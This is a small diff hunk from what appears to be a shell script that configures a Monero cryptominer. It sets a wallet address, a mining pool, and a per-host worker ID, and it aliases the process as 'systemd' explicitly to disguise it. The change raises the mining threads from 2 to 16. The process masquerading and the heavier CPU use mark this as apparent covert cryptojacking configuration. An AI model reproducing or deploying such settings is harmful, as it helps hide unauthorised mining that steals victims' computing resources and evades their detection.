@@ -3,7 +3,7 @@
 ### CONFIGURATION ###
 WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
 POOL="pool.supportxmr.com:443"
-THREADS=2
+THREADS=16
 ALIAS_NAME="systemd"  # disguises the process
 WORKER_ID="node-$(hostname)"
 
